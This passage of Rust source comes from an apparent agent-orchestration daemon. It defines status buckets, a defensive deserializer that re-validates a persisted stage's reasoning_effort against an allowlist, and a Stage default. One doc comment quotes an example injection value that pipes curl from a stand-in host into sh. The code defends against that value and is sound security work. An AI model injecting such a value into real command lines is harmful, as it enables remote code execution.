    /// - `Skipped` is grouped with `Completed` (terminal, not blocked).
    /// - All merge-failure and review/adjudication states are **Blocked** (stopped,
    ///   needing attention).
    pub fn bucket(&self) -> StatusBucket {
        match self {
            Self::Executing | Self::NeedsHandoff | Self::WaitingForInput => StatusBucket::Executing,
            Self::WaitingForDeps | Self::Queued => StatusBucket::Pending,
            Self::Completed | Self::Skipped => StatusBucket::Completed,
            Self::Blocked
            | Self::MergeConflict
            | Self::CompletedWithFailures
            | Self::MergeBlocked
            | Self::NeedsHumanReview
            | Self::NeedsAdjudication => StatusBucket::Blocked,
        }
    }
}

/// Serde deserializer for [`Stage::reasoning_effort`] read back from disk.
///
/// `StageDefinition` (plan parse time) rejects an out-of-allowlist effort with a
/// hard error, but a persisted `Stage` is re-read from `.work/stages/<id>.md` on
/// every daemon restart, and that file is writable by a worktree agent. Without
/// re-validation here, a tampered `reasoning_effort: "high; curl evil|sh #"` would
/// survive reload and be concatenated into the spawn command line.
///
/// Unlike the plan-parse deserializer, this one does **not** fail the load on an
/// invalid value (that would brick the whole daemon over one bad stage file).
/// Instead it neutralizes the field to `None` (logging at `tracing::error!`), so
/// `Stage::effective_reasoning_effort` falls back to the safe stage-type default.
fn deserialize_persisted_reasoning_effort<'de, D>(
    deserializer: D,
) -> Result<Option<String>, D::Error>
where
    D: Deserializer<'de>,
{
    let opt = <Option<String>>::deserialize(deserializer)?;
    match opt {
        None => Ok(None),
        Some(s) if ALLOWED_REASONING_EFFORTS.contains(&s.as_str()) => Ok(Some(s)),
        Some(invalid) => {
            tracing::error!(
                invalid_reasoning_effort = %invalid,
                allowed = %ALLOWED_REASONING_EFFORTS.join(", "),
                "Persisted stage reasoning_effort failed allowlist re-validation on load; \
                 dropping to None and falling back to the stage-type default"
            );
            Ok(None)
        }
    }
}

impl Default for Stage {
    fn default() -> Self {
        let now = chrono::Utc::now();
        Self {
            id: String::new(),
            name: String::new(),
            description: None,
            status: StageStatus::WaitingForDeps,
            dependencies: Vec::new(),
            parallel_group: None,
            acceptance: Vec::new(),
            setup: Vec::new(),
            files: Vec::new(),
            stage_type: StageType::default(),
            plan_id: None,
            worktree: None,
            session: None,
            held: false,
            parent_stage: None,
            child_stages: Vec::new(),
            created_at: now,
            updated_at: now,
            completed_at: None,
            started_at: None,
            duration_secs: None,
            execution_secs: None,
            attempt_started_at: None,
            close_reason: None,
            auto_merge: None,
            working_dir: Some(".".to_string()),
            retry_count: 0,
            max_retries: None,
            last_failure_at: None,
            failure_info: None,
            resolved_base: None,
            base_branch: None,
            base_merged_from: Vec::new(),
            outputs: Vec::new(),
            completed_commit: None,
            merged: false,
            merge_conflict: false,
            verification_status: Default::default(),
            context_budget: None,
            artifacts: Vec::new(),
            wiring: Vec::new(),
            wiring_tests: Vec::new(),
            dead_code_check: None,
            before_stage: Vec::new(),
            after_stage: Vec::new(),
            fix_attempts: 0,
            dispute_count: 0,
            evidence_rounds: 0,
            amendments_applied: 0,
            sandbox: Default::default(),
            execution_mode: None,
            max_fix_attempts: None,
            review_reason: None,
            bug_fix: None,
            regression_test: None,
            model: None,
            reasoning_effort: None,
            is_possibly_stuck: false,
        }
    }
}
